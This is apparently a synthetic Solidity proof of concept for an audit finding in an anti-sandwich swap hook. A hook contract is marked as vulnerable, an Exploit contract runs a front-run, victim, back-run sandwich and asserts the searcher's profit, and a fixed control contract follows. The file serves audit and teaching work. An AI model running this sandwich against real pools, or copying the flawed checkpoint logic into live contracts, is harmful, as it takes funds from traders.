// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  OpenZeppelin AntiSandwichHook — the first swap of a block stamps the
    checkpoint even when the tick does not increase, so state.ticks is never
    copied (OpenZeppelin, finding #61376, May 2025).

    SYNTHETIC, cheatcode-free, one block. Pool starts 1000/1000. The first
    swap sells 400 A and the tick falls, so the copy loop does not run.
    The later back-run is not capped at the start-of-block quote and the
    searcher nets 49999999999999999998 wei of A. The victim's 100 A sell
    receives 47619047619047619047 B instead of the start quote. Control
    snapshots reserves before the first swap and the back-run loses money. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Token public tokenA;
    Token public tokenB;
    address public hook;
    uint256 public reserveA;
    uint256 public reserveB;

    constructor(Token _a, Token _b) {
        tokenA = _a;
        tokenB = _b;
    }

    function setHook(address _hook) external {
        require(hook == address(0), "hook");
        hook = _hook;
    }

    function seed(uint256 amountA, uint256 amountB) external {
        require(reserveA == 0 && reserveB == 0, "seeded");
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);
        reserveA = amountA;
        reserveB = amountB;
    }

    function tick() public view returns (int24) {
        return int24(uint24(reserveB / 1 ether));
    }

    function execAforB(address to, uint256 amountIn, uint256 maxOut) external returns (uint256 out) {
        require(msg.sender == hook, "hook");
        uint256 raw = reserveB * amountIn / (reserveA + amountIn);
        out = raw > maxOut ? maxOut : raw;
        reserveA += amountIn;
        reserveB -= out;
        tokenB.transfer(to, out);
    }

    function execBforA(address to, uint256 amountIn, uint256 maxOut) external returns (uint256 out) {
        require(msg.sender == hook, "hook");
        uint256 raw = reserveA * amountIn / (reserveB + amountIn);
        out = raw > maxOut ? maxOut : raw;
        reserveB += amountIn;
        reserveA -= out;
        tokenA.transfer(to, out);
    }
}

contract Hook {
    int24 public constant TICK_SPACING = 10;

    Token public tokenA;
    Token public tokenB;
    Pool public pool;
    int24 public slot0Tick;
    uint256 public snapA;
    uint256 public snapB;
    uint256 public blockNumber = 2;
    bool public ticksReady;

    constructor(Token _a, Token _b, Pool _pool) {
        tokenA = _a;
        tokenB = _b;
        pool = _pool;
    }

    function swapAforB(uint256 amountIn) external returns (uint256 out) {
        _before();
        tokenA.transferFrom(msg.sender, address(pool), amountIn);
        uint256 maxOut = type(uint256).max;
        if (ticksReady) maxOut = snapB * amountIn / (snapA + amountIn);
        out = pool.execAforB(msg.sender, amountIn, maxOut);
        _after(pool.tick());
    }

    function swapBforA(uint256 amountIn) external returns (uint256 out) {
        _before();
        tokenB.transferFrom(msg.sender, address(pool), amountIn);
        uint256 maxOut = type(uint256).max;
        if (ticksReady) maxOut = snapA * amountIn / (snapB + amountIn);
        out = pool.execBforA(msg.sender, amountIn, maxOut);
        _after(pool.tick());
    }

    function _before() internal {
        if (blockNumber != block.number) slot0Tick = pool.tick();
    }

    function _after(int24 tickAfter) internal {
        if (blockNumber != block.number) {
            blockNumber = block.number;
            // @> VULN: ticks are copied only when the first swap moves the tick up
            for (int24 t = slot0Tick; t < tickAfter; t += TICK_SPACING) {
                snapA = pool.reserveA();
                snapB = pool.reserveB();
                ticksReady = true;
            }
        }
    }
}

contract Trader {
    Token public tokenA;
    Hook public hook;

    constructor(Token _a, Hook _hook) {
        tokenA = _a;
        hook = _hook;
        tokenA.approve(address(_hook), type(uint256).max);
    }

    function sell(uint256 amountIn) external returns (uint256) {
        return hook.swapAforB(amountIn);
    }
}

contract Exploit {
    uint256 public constant FRONT = 400 ether;
    uint256 public constant VICTIM_IN = 100 ether;
    uint256 public constant NET = 49999999999999999998;
    uint256 public constant VICTIM_OUT = 47619047619047619047;

    Token public tokenA;
    Token public tokenB;
    Pool public pool;
    Hook public hook;
    Trader public trader;
    uint256 public gained;
    uint256 public victimOut;

    constructor() {
        tokenA = new Token("Token A", "TKA", 18);
        tokenB = new Token("Token B", "TKB", 18);
        pool = new Pool(tokenA, tokenB);
        hook = new Hook(tokenA, tokenB, pool);
        pool.setHook(address(hook));
        trader = new Trader(tokenA, hook);
        tokenA.mint(address(this), 1500 ether);
        tokenB.mint(address(this), 1000 ether);
        tokenA.approve(address(pool), 1000 ether);
        tokenB.approve(address(pool), 1000 ether);
        pool.seed(1000 ether, 1000 ether);
        tokenA.transfer(address(trader), VICTIM_IN);
    }

    function run() external {
        tokenA.approve(address(hook), FRONT);
        uint256 frontB = hook.swapAforB(FRONT);
        victimOut = trader.sell(VICTIM_IN);
        tokenB.approve(address(hook), frontB);
        uint256 backA = hook.swapBforA(frontB);
        gained = backA - FRONT;
        require(gained == NET, "searcher profit");
        require(victimOut == VICTIM_OUT, "victim fill");
        require(!hook.ticksReady(), "ticks were snapshotted");
    }
}

/// @dev Control: the start-of-block reserves are copied before the first swap.
contract HookFixed {
    Token public tokenA;
    Token public tokenB;
    Pool public pool;
    uint256 public snapA;
    uint256 public snapB;
    uint256 public blockNumber = 2;
    bool public ticksReady;

    constructor(Token _a, Token _b, Pool _pool) {
        tokenA = _a;
        tokenB = _b;
        pool = _pool;
    }

    function swapAforB(uint256 amountIn) external returns (uint256 out) {
        _before();
        tokenA.transferFrom(msg.sender, address(pool), amountIn);
        uint256 maxOut = snapB * amountIn / (snapA + amountIn);
        out = pool.execAforB(msg.sender, amountIn, maxOut);
    }

    function swapBforA(uint256 amountIn) external returns (uint256 out) {
        _before();
        tokenB.transferFrom(msg.sender, address(pool), amountIn);
        uint256 maxOut = snapA * amountIn / (snapB + amountIn);
        out = pool.execBforA(msg.sender, amountIn, maxOut);
    }

    function _before() internal {
        if (blockNumber != block.number) {
            snapA = pool.reserveA();
            snapB = pool.reserveB();
            ticksReady = true;
            blockNumber = block.number;
        }
    }
}
